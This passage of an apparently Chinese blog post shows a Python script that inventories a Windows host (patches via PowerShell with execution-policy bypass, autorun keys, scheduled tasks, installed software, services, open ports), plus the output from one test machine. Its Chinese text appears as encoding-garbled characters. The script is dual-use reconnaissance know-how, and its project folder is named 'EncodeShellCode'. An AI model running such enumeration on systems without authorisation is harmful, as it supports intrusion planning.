value_name)</span><br><span class="line">            <span class="keyword">return</span> value</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># print(f&quot;Error: &#123;e&#125;&quot;)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSystemInfo</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] è·å–ç³»ç»Ÿä¿¡æ¯ã€è¡¥ä¸ä¿¡æ¯......\n&quot;</span>)</span><br><span class="line">    <span class="comment"># è·å–æ“ä½œç³»ç»Ÿç‰ˆæœ¬ä¿¡æ¯</span></span><br><span class="line">    os_version = platform.platform()</span><br><span class="line">    <span class="comment"># æ‰“å°æ“ä½œç³»ç»Ÿç‰ˆæœ¬ä¿¡æ¯</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;æ“ä½œç³»ç»Ÿç‰ˆæœ¬:&quot;</span>, os_version)</span><br><span class="line">    <span class="comment"># è®¾ç½® PowerShell è„šæœ¬</span></span><br><span class="line">    powershell_script = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    # # è®¾ç½®æ‰§è¡Œç­–ç•¥</span></span><br><span class="line"><span class="string">    # Set-ExecutionPolicy RemoteSigned -Force</span></span><br><span class="line"><span class="string">    # </span></span><br><span class="line"><span class="string">    # # è·å–å·²å®‰è£…çš„æ‰€æœ‰è¡¥ä¸ä¿¡æ¯</span></span><br><span class="line"><span class="string">    # $patches = Get-HotFix</span></span><br><span class="line"><span class="string">    # $patchCount = $patches.Count</span></span><br><span class="line"><span class="string">    # Write-Output &quot;å·²å®‰è£…çš„è¡¥ä¸æ•°é‡: $patchCount&quot;</span></span><br><span class="line"><span class="string">    # </span></span><br><span class="line"><span class="string">    # foreach ($patch in $patches) &#123;</span></span><br><span class="line"><span class="string">    #     # Write-Output &quot;è¡¥ä¸å·: $($patch.HotFixID) - æè¿°: $($patch.Description)&quot;</span></span><br><span class="line"><span class="string">    #     Write-Output &quot;è¡¥ä¸å·: $($patch.HotFixID) &quot;</span></span><br><span class="line"><span class="string">    # </span></span><br><span class="line"><span class="string">    # &#125;</span></span><br><span class="line"><span class="string">    # è®¾ç½®è¾“å‡ºç¼–ç ä¸º UTF-8</span></span><br><span class="line"><span class="string">    $OutputEncoding = [System.Text.Encoding]::UTF8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # è®¾ç½®æ‰§è¡Œç­–ç•¥</span></span><br><span class="line"><span class="string">    Set-ExecutionPolicy RemoteSigned -Force</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # è·å–ä¸»æœºå</span></span><br><span class="line"><span class="string">    $hostname = $env:COMPUTERNAME</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # æ‰“å°ä¸»æœºå</span></span><br><span class="line"><span class="string">    Write-Host &quot;ä¸»æœºå: $hostname&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # è·å– IP åœ°å€ä¿¡æ¯</span></span><br><span class="line"><span class="string">    $ipInfo = Get-NetIPAddress | Where-Object &#123; $_.AddressFamily -eq &quot;IPv4&quot; &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # æå– IP åœ°å€</span></span><br><span class="line"><span class="string">    $ipAddress = $ipInfo.IPAddress</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # æ‰“å° IP åœ°å€</span></span><br><span class="line"><span class="string">    Write-Host &quot;IP åœ°å€: $ipAddress&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # è·å–æ“ä½œç³»ç»Ÿç‰ˆæœ¬ä¿¡æ¯</span></span><br><span class="line"><span class="string">    $osVersion = [System.Environment]::OSVersion</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # è·å–æ“ä½œç³»ç»Ÿåç§°</span></span><br><span class="line"><span class="string">    $osName = (Get-CimInstance Win32_OperatingSystem).Caption</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # æ‰“å°æ“ä½œç³»ç»Ÿåç§°</span></span><br><span class="line"><span class="string">    Write-Host &quot;æ“ä½œç³»ç»Ÿåç§°: $osName&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # æ‰“å°æ“ä½œç³»ç»Ÿç‰ˆæœ¬ä¿¡æ¯</span></span><br><span class="line"><span class="string">    Write-Host &quot;æ“ä½œç³»ç»Ÿç‰ˆæœ¬: $($osVersion.VersionString)&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # è·å– Windows ç‰ˆæœ¬å·</span></span><br><span class="line"><span class="string">    $windowsVersion = &quot;$($osVersion.Version.Major).$($osVersion.Version.Minor)&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # æ‰“å° Windows ç‰ˆæœ¬å·</span></span><br><span class="line"><span class="string">    Write-Host &quot;Windows ç‰ˆæœ¬å·: $windowsVersion&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # è·å–å·²å®‰è£…çš„æ‰€æœ‰è¡¥ä¸ä¿¡æ¯</span></span><br><span class="line"><span class="string">    $patches = Get-HotFix</span></span><br><span class="line"><span class="string">    $patchCount = $patches.Count</span></span><br><span class="line"><span class="string">    Write-Output &quot;å·²å®‰è£…çš„è¡¥ä¸æ•°é‡: $patchCount&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    foreach ($patch in $patches) &#123;</span></span><br><span class="line"><span class="string">         Write-Output &quot;è¡¥ä¸å·: $($patch.HotFixID) - æè¿°: $($patch.Description)&quot;</span></span><br><span class="line"><span class="string">        # Write-Output &quot;è¡¥ä¸å·: $($patch.HotFixID) &quot;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ‰§è¡Œ PowerShell è„šæœ¬</span></span><br><span class="line">    <span class="comment"># process = subprocess.Popen([&quot;powershell&quot;, &quot;-Command&quot;, powershell_script], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)</span></span><br><span class="line">    process = subprocess.Popen([<span class="string">&quot;powershell&quot;</span>, <span class="string">&quot;-ExecutionPolicy&quot;</span>, <span class="string">&quot;Bypass&quot;</span>, <span class="string">&quot;-Command&quot;</span>, powershell_script],</span><br><span class="line">                               stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=<span class="literal">True</span>)</span><br><span class="line">    output, error = process.communicate()</span><br><span class="line">    <span class="comment"># æ‰“å°è¾“å‡ºç»“æœ</span></span><br><span class="line">    <span class="built_in">print</span>(output)</span><br><span class="line">    <span class="comment"># å¦‚æœæœ‰é”™è¯¯ï¼Œæ‰“å°é”™è¯¯ä¿¡æ¯</span></span><br><span class="line">    <span class="comment"># if error:</span></span><br><span class="line">    <span class="comment">#     print(&quot;é”™è¯¯ä¿¡æ¯:&quot;, error)</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getInstallAppInfo</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] è·å–ä¸»æœºå·²å®‰è£…åº”ç”¨ä¿¡æ¯......\n&quot;</span>)</span><br><span class="line">    <span class="comment">#åˆ—å‡º HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall ä¸‹çš„å­é¡¹åŠå…¶ DisplayName å€¼</span></span><br><span class="line">    hive1 = winreg.HKEY_LOCAL_MACHINE</span><br><span class="line">    subkey = <span class="string">r&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall&quot;</span></span><br><span class="line">    subkeys1 = list_registry_subkeys(hive1, subkey)</span><br><span class="line"></span><br><span class="line">    hive2 = winreg.HKEY_CURRENT_USER</span><br><span class="line">    subkeys2 = list_registry_subkeys(hive2, subkey)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[=] HKLM:&quot;</span>)</span><br><span class="line">    <span class="comment"># æ‰“å°ç»“æœ</span></span><br><span class="line">    <span class="keyword">for</span> subkey_name <span class="keyword">in</span> subkeys1:</span><br><span class="line">        subkey_path = <span class="string">fr&quot;<span class="subst">&#123;subkey&#125;</span>\&#123;subkey_name&#125;&quot;</span></span><br><span class="line">        display_name = get_registry_value(hive1, subkey_path, <span class="string">&quot;DisplayName&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> display_name:</span><br><span class="line">            <span class="built_in">print</span>(display_name)</span><br><span class="line">            <span class="comment"># print(f&quot;&#123;subkey_name&#125;: &#123;display_name&#125;&quot;)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># print(f&quot;&#123;subkey_name&#125;: Display Name not found.&quot;)</span></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">50</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[=] HKCU:&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> subkey_name <span class="keyword">in</span> subkeys2:</span><br><span class="line">        subkey_path = <span class="string">fr&quot;<span class="subst">&#123;subkey&#125;</span>\&#123;subkey_name&#125;&quot;</span></span><br><span class="line">        display_name = get_registry_value(hive2, subkey_path, <span class="string">&quot;DisplayName&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> display_name:</span><br><span class="line">            <span class="built_in">print</span>(display_name)</span><br><span class="line">            <span class="comment"># print(f&quot;&#123;subkey_name&#125;: &#123;display_name&#125;&quot;)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># print(f&quot;&#123;subkey_name&#125;: Display Name not found.&quot;)</span></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getAutoRunInfo</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] è·å–ä¸»æœºå¯åŠ¨é¡¹ä¿¡æ¯......\n&quot;</span>)</span><br><span class="line">    print_startup_items(startup_items_current_user_run, <span class="string">&quot;HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&quot;</span>)</span><br><span class="line">    print_startup_items(startup_items_current_user_runonce, <span class="string">&quot;HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce&quot;</span>)</span><br><span class="line">    print_startup_items(startup_items_local_machine_run, <span class="string">&quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&quot;</span>)</span><br><span class="line">    print_startup_items(startup_items_local_machine_runonce, <span class="string">&quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getScheduleTaskInfo</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] è·å–ä¸»æœºè®¡åˆ’ä»»åŠ¡ä¿¡æ¯......[æ³¨:ä½¿ç”¨COMæ¥å£ä»…å¯è·å–éƒ¨åˆ†]\n&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        root_folder = get_task_scheduler()</span><br><span class="line">        print_tasks_info(root_folder)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getServiceInfo</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] è·å–ä¸»æœºæœåŠ¡ä¿¡æ¯......\n&quot;</span>)</span><br><span class="line">    services = get_services()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ‰“å°æœåŠ¡ä¿¡æ¯</span></span><br><span class="line">    <span class="keyword">for</span> service <span class="keyword">in</span> services:</span><br><span class="line">        <span class="comment"># æ‰€æœ‰æœåŠ¡</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Service Name: <span class="subst">&#123;service.Name&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Display Name: <span class="subst">&#123;service.DisplayName&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Status: <span class="subst">&#123;service.State&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">50</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getRunningServiceInfo</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] è·å–ä¸»æœºæ­£åœ¨è¿è¡Œçš„æœåŠ¡ä¿¡æ¯......\n&quot;</span>)</span><br><span class="line">    services = get_services()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ‰“å°æœåŠ¡ä¿¡æ¯</span></span><br><span class="line">    <span class="keyword">for</span> service <span class="keyword">in</span> services:</span><br><span class="line">        <span class="comment"># åªè¾“å‡ºè¿è¡ŒæœåŠ¡</span></span><br><span class="line">        <span class="keyword">if</span> service.State == <span class="string">&quot;Running&quot;</span>:</span><br><span class="line">           <span class="built_in">print</span>(<span class="string">f&quot;Service Name: <span class="subst">&#123;service.Name&#125;</span>&quot;</span>)</span><br><span class="line">           <span class="comment"># print(f&quot;Display Name: &#123;service.DisplayName&#125;&quot;)</span></span><br><span class="line">           <span class="comment"># print(f&quot;Status: &#123;service.State&#125;&quot;)</span></span><br><span class="line">           <span class="comment"># print(&quot;==================================&quot;)</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getPortInfo</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] è·å–ä¸»æœºå¼€æ”¾ç«¯å£æœåŠ¡ä¿¡æ¯......\n&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = subprocess.run([<span class="string">&quot;netstat&quot;</span>, <span class="string">&quot;-ano&quot;</span>], capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>, check=<span class="literal">True</span>)</span><br><span class="line">        netstat_output = result.stdout</span><br><span class="line"></span><br><span class="line">        <span class="comment"># ç­›é€‰å‡º LISTENING æˆ– ESTABLISHED çš„è¡Œå¹¶è¾“å‡º</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> netstat_output.splitlines():</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;LISTENING&quot;</span> <span class="keyword">in</span> line <span class="keyword">or</span> <span class="string">&quot;ESTABLISHED&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">                <span class="built_in">print</span>(line)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> subprocess.CalledProcessError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GetAllInfo</span>():</span><br><span class="line">    getSystemInfo()</span><br><span class="line">    getAutoRunInfo()</span><br><span class="line">    getScheduleTaskInfo()</span><br><span class="line">    getInstallAppInfo()</span><br><span class="line">    <span class="comment"># getServiceInfo()</span></span><br><span class="line">    getRunningServiceInfo()</span><br><span class="line">    getPortInfo()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">   GetAllInfo()</span><br></pre></td></tr></table></figure>

<p>Output</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\test\PycharmProjects\EncodeShellCode\venv\Scripts\python.exe C:\Users\test\PycharmProjects\EncodeShellCode\GetPCInfo\GetAllInfo.py </span><br><span class="line">[+] è·å–ç³»ç»Ÿä¿¡æ¯ã€è¡¥ä¸ä¿¡æ¯......</span><br><span class="line"></span><br><span class="line">æ“ä½œç³»ç»Ÿç‰ˆæœ¬: Windows-10-10.0.19045-SP0</span><br><span class="line">ä¸»æœºå: DESKTOP-F3958O4</span><br><span class="line">IP åœ°å€: 192.168.181.141 127.0.0.1</span><br><span class="line">æ“ä½œç³»ç»Ÿåç§°: Microsoft Windows 10 ä¸“ä¸šç‰ˆ</span><br><span class="line">æ“ä½œç³»ç»Ÿç‰ˆæœ¬: Microsoft Windows NT 10.0.19045.0</span><br><span class="line">Windows ç‰ˆæœ¬å·: 10.0</span><br><span class="line">å·²å®‰è£…çš„è¡¥ä¸æ•°é‡: 23</span><br><span class="line">è¡¥ä¸å·: KB5034466 - æè¿°: Update</span><br><span class="line">è¡¥ä¸å·: KB5030841 - æè¿°: Update</span><br><span class="line">è¡¥ä¸å·: KB5003791 - æè¿°: Update</span><br><span class="line">è¡¥ä¸å·: KB5011048 - æè¿°: Update</span><br><span class="line">è¡¥ä¸å·: KB5011050 - æè¿°: Update</span><br><span class="line">è¡¥ä¸å·: KB5012170 - æè¿°: Security Update</span><br><span class="line">è¡¥ä¸å·: KB5015684 - æè¿°: Update</span><br><span class="line">è¡¥ä¸å·: KB5034763 - æè¿°: Security Update</span><br><span class="line">è¡¥ä¸å·: KB5016705 - æè¿°: Update</span><br><span class="line">è¡¥ä¸å·: KB5020372 - æè¿°: Update</span><br><span class="line">è¡¥ä¸å·: KB5022924 - æè¿°: Update</span><br><span class="line">è¡¥ä¸å·: KB5023794 - æè¿°: Update</span><br><span class="line">è¡¥ä¸å·: KB5025315 - æè¿°: Update</span><br><span class="line">è¡¥ä¸å·: KB5026879 - æè¿°: Update</span><br><span class="line">è¡¥ä¸å·: KB5028318 - æè¿°: Update</span><br><span class="line">è¡¥ä¸å·: KB5028380 - æè¿°: Update</span><br><span class="line">è¡¥ä¸å·: KB5029709 - æè¿°: Update</span><br><span class="line">è¡¥ä¸å·: KB5031539 - æè¿°: Update</span><br><span class="line">è¡¥ä¸å·: KB5032392 - æè¿°: Update</span><br><span class="line">è¡¥ä¸å·: KB5032907 - æè¿°: Update</span><br><span class="line">è¡¥ä¸å·: KB5034224 - æè¿°: Update</span><br><span class="line">è¡¥ä¸å·: KB5005699 - æè¿°: Security Update</span><br><span class="line">è¡¥ä¸å·: KB5034441 - æè¿°: Security Update</span><br><span class="line"></span><br><span class="line">==================================================</span><br><span class="line">[+] è·å–ä¸»æœºå¯åŠ¨é¡¹ä¿¡æ¯......</span><br><span class="line"></span><br><span class="line">[+] HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run:</span><br><span class="line"></span><br><span class="line">Name: MicrosoftEdgeAutoLaunch_AF2BBCAD27A22A0C1234356BDE5EE233</span><br><span class="line">[+] HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce:</span><br><span class="line"></span><br><span class="line">Name: Application Restart #4</span><br><span class="line">Name: Application Restart #7</span><br><span class="line">Name: Application Restart #5</span><br><span class="line">[+] HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run:</span><br><span class="line"></span><br><span class="line">Name: SecurityHealth</span><br><span class="line">Name: VMware User Process</span><br><span class="line">Name: Everything</span><br><span class="line">Name: Sysdiag</span><br><span class="line">Name: KeePass 2 PreLoad</span><br><span class="line">Name: DocFetcher-Daemon</span><br><span class="line">==================================================</span><br><span class="line">[+] è·å–ä¸»æœºè®¡åˆ’ä»»åŠ¡ä¿¡æ¯......[æ³¨:ä½¿ç”¨COMæ¥å£ä»…å¯è·å–éƒ¨åˆ†]</span><br><span class="line"></span><br><span class="line">Task Name: 360ZipUpdater</span><br><span class="line">Next Run Time: 1899-12-30 00:00:00+00:00</span><br><span class="line">State: 1</span><br><span class="line">--------------------------------------------------</span><br><span class="line">Task Name: OneDrive Reporting Task-S-1-5-21-2161087652-2094102714-1756561397-1000</span><br><span class="line">Next Run Time: 2024-02-28 23:50:56+00:00</span><br><span class="line">State: 3</span><br><span class="line">--------------------------------------------------</span><br><span class="line">Task Name: OneDrive Standalone Update Task-S-1-5-21-2161087652-2094102714-1756561397-1000</span><br><span class="line">Next Run Time: 2024-02-28 22:52:37+00:00</span><br><span class="line">State: 3</span><br><span class="line">--------------------------------------------------</span><br><span class="line">==================================================</span><br><span class="line">[+] è·å–ä¸»æœºå·²å®‰è£…åº”ç”¨ä¿¡æ¯......</span><br><span class="line"></span><br><span class="line">[=] HKLM:</span><br><span class="line">Upscayl 2.8.6</span><br><span class="line">7-Zip 23.01 (x64)</span><br><span class="line">DocFetcher</span><br><span class="line">Everything 1.4.1.1022 Lite (x64)</span><br><span class="line">GIMP 2.10.34</span><br><span class="line">Git</span><br><span class="line">ç«ç»’å®‰å…¨è½¯ä»¶</span><br><span class="line">ImDisk Virtual Disk Driver</span><br><span class="line">Mozilla Maintenance Service</span><br><span class="line">WinRAR 6.21 (64-ä½)</span><br><span class="line">Microsoft Visual C++ 2013 x64 Additional Runtime - 12.0.40664</span><br><span class="line">Go Programming Language amd64 go1.20.4</span><br><span class="line">Passware Kit Demo 2022 v2 (64-bit)</span><br><span class="line">Microsoft Visual C++ 2010  x64 Redistributable - 10.0.40219</span><br><span class="line">Python 3.9.13 Documentation (64-bit)</span><br><span class="line">Microsoft Update Health Tools</span><br><span class="line">VMware Tools</span><br><span class="line">Microsoft Visual C++ 2022 X64 Additional Runtime - 14.31.30818</span><br><span class="line">DiskGenius V5.5.1</span><br><span class="line">Attribute Changer 11.10</span><br><span class="line">Typora 1.1</span><br><span class="line">Microsoft Visual C++ 2012 x64 Additional Runtime - 11.0.61135</span><br><span class="line">Microsoft .NET Host - 6.0.27 (x64)</span><br><span class="line">DiagnosticsHub_CollectionService</span><br><span class="line">Windows SDK for Windows Store Apps DirectX x64 Remote</span><br><span class="line">VS JIT Debugger</span><br><span class="line">DB Browser for SQLite</span><br><span class="line">Microsoft Visual C++ 2013 x64 Minimum Runtime - 12.0.40664</span><br><span class="line">Microsoft Visual C++ 2022 X64 Minimum Runtime - 14.31.30818</span><br><span class="line">IntelliTraceProfilerProxy</span><br><span class="line">Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.7523</span><br><span class="line">Python 3.9.13 Utility Scripts (64-bit)</span><br><span class="line">Microsoft Visual Studio Team Foundation Server 2017 Update 9 Office Integration Language Pack (x64) - ENU</span><br><span class="line">Application Verifier x64 External Package</span><br><span class="line">Java SE Development Kit 8 Update 301 (64-bit)</span><br><span class="line">Windows App Certification Kit Native Components</span><br><span class="line">Microsoft Visual Studio Installer</span><br><span class="line">Java 8 Update 401 (64-bit)</span><br><span class="line">Python 3.9.13 pip Bootstrap (64-bit)</span><br><span class="line">Microsoft .NET Host FX Resolver - 6.0.27 (x64)</span><br><span class="line">Python 3.9.13 Test Suite (64-bit)</span><br><span class="line">Microsoft .NET Runtime - 6.0.27 (x64)</span><br><span class="line">Update for Windows 10 for x64-based Systems (KB5001716)</span><br><span class="line">VS Script Debugging Common</span><br><span class="line">Python 3.9.13 Standard Library (64-bit)</span><br><span class="line">AccessData FTK Imager</span><br><span class="line">ILSpy</span><br><span class="line">Python 3.9.13 Development Libraries (64-bit)</span><br><span class="line">Application Verifier x64 External Package</span><br><span class="line">vs_Graphics_Singletonx64</span><br><span class="line">Python 3.9.13 Add to Path (64-bit)</span><br><span class="line">Mono for Windows (x64)</span><br><span class="line">Microsoft Visual C++ 2012 x64 Minimum Runtime - 11.0.61135</span><br><span class="line">Microsoft Visual Studio Team Foundation Server 2017 Update 9 Office Integration (x64)</span><br><span class="line">Python 3.9.13 Executables (64-bit)</span><br><span class="line">Python 3.9.13 Core Interpreter (64-bit)</span><br><span class="line">Universal CRT Tools x64</span><br><span class="line">icecap_collection_x64</span><br><span class="line">Microsoft Windows Desktop Runtime - 6.0.27 (x64)</span><br><span class="line">Python 3.9.13 Tcl/Tk Support (64-bit)</span><br><span class="line">Windows SDK DirectX x64 Remote</span><br><span class="line">Application Verifier x64 External Package (OnecoreUAP)</span><br><span class="line">Application Verifier x64 External Package (DesktopEditions)</span><br><span class="line">Microsoft Visual C++ 2017 X64 Debug Runtime - 14.16.27033</span><br><span class="line">Microsoft System CLR Types for SQL Server vNext CTP1.6</span><br><span class="line">--------------------------------------------------</span><br><span class="line">[=] HKCU:</span><br><span class="line">Clash for Windows 0.20.16</span><br><span class="line">DBeaver 23.0.4 (current user)</span><br><span class="line">Microsoft OneDrive</span><br><span class="line">Rustup: the Rust toolchain installer</span><br><span class="line">SageMath version 9.3</span><br><span class="line">Python 3.9.13 (64-bit)</span><br><span class="line">==================================================</span><br><span class="line">[+] è·å–ä¸»æœºæ­£åœ¨è¿è¡Œçš„æœåŠ¡ä¿¡æ¯......</span><br><span class="line"></span><br><span class="line">Service Name: Appinfo</span><br><span class="line">Service Name: AudioEndpointBuilder</span><br><span class="line">Service Name: Audiosrv</span><br><span class="line">Service Name: BFE</span><br><span class="line">Service Name: BrokerInfrastructure</span><br><span class="line">Service Name: BthAvctpSvc</span><br><span class="line">Service Name: CDPSvc</span><br><span class="line">Service Name: COMSysApp</span><br><span class="line">Service Name: CoreMessagingRegistrar</span><br><span class="line">Service Name: CryptSvc</span><br><span class="line">Service Name: DcomLaunch</span><br><span class="line">Service Name: DeviceAssociationService</span><br><span class="line">Service Name: Dhcp</span><br><span class="line">Service Name: DiagTrack</span><br><span class="line">Service Name: DispBrokerDesktopSvc</span><br><span class="line">Service Name: Dnscache</span><br><span class="line">Service Name: DoSvc</span><br><span class="line">Service Name: DPS</span><br><span class="line">Service Name: DsmSvc</span><br><span class="line">Service Name: DsSvc</span><br><span class="line">Service Name: DusmSvc</span><br><span class="line">Service Name: EventLog</span><br><span class="line">Service Name: EventSystem</span><br><span class="line">Service Name: Everything</span><br><span class="line">Service Name: fdPHost</span><br><span class="line">Service Name: FDResPub</span><br><span class="line">Service Name: FontCache</span><br><span class="line">Service Name: HipsDaemon</span><br><span class="line">Service Name: HRWSCCtrl</span><br><span class="line">Service Name: ImDskSvc</span><br><span class="line">Service Name: InstallService</span><br><span class="line">Service Name: iphlpsvc</span><br><span class="line">Service Name: IpOverUsbSvc</span><br><span class="line">Service Name: KeyIso</span><br><span class="line">Service Name: LanmanServer</span><br><span class="line">Service Name: LanmanWorkstation</span><br><span class="line">Service Name: LicenseManager</span><br><span class="line">Service Name: lmhosts</span><br><span class="line">Service Name: LSM</span><br><span class="line">Service Name: mpssvc</span><br><span class="line">Service Name: MSDTC</span><br><span class="line">Service Name: NcbService</span><br><span class="line">Service Name: NcdAutoSetup</span><br><span class="line">Service Name: netprofm</span><br><span class="line">Service Name: NlaSvc</span><br><span class="line">Service Name: nsi</span><br><span class="line">Service Name: PcaSvc</span><br><span class="line">Service Name: phpStudySrv</span><br><span class="line">Service Name: PlugPlay</span><br><span class="line">Service Name: Power</span><br><span class="line">Service Name: ProfSvc</span><br><span class="line">Service Name: RasMan</span><br><span class="line">Service Name: RmSvc</span><br><span class="line">Service Name: RpcEptMapper</span><br><span class="line">Service Name: RpcSs</span><br><span class="line">Service Name: SamSs</span><br><span class="line">Service Name: Schedule</span><br><span class="line">Service Name: SecurityHealthService</span><br><span class="line">Service Name: SENS</span><br><span class="line">Service Name: SgrmBroker</span><br><span class="line">Service Name: ShellHWDetection</span><br><span class="line">Service Name: Spooler</span><br><span class="line">Service Name: SSDPSRV</span><br><span class="line">Service Name: SstpSvc</span><br><span class="line">Service Name: StateRepository</span><br><span class="line">Service Name: StorSvc</span><br><span class="line">Service Name: SysMain</span><br><span class="line">Service Name: Sysmon64</span><br><span class="line">Service Name: SystemEventsBroker</span><br><span class="line">Service Name: TabletInputService</span><br><span class="line">Service Name: Themes</span><br><span class="line">Service Name: TimeBrokerSvc</span><br><span class="line">Service Name: TokenBroker</span><br><span class="line">Service Name: TrkWks</span><br><span class="line">Service Name: TrustedInstaller</span><br><span class="line">Service Name: UserManager</span><br><span class="line">Service Name: UsoSvc</span><br><span class="line">Service Name: VaultSvc</span><br><span class="line">Service Name: VGAuthService</span><br><span class="line">Service Name: vm3dservice</span><br><span class="line">Service Name: VMTools</span><br><span class="line">Service Name: WaaSMedicSvc</span><br><span class="line">Service Name: Wcmsvc</span><br><span class="line">Service Name: WdiServiceHost</span><br><span class="line">Service Name: WinHttpAutoProxySvc</span><br><span class="line">Service Name: Winmgmt</span><br><span class="line">Service Name: WpnService</span><br><span 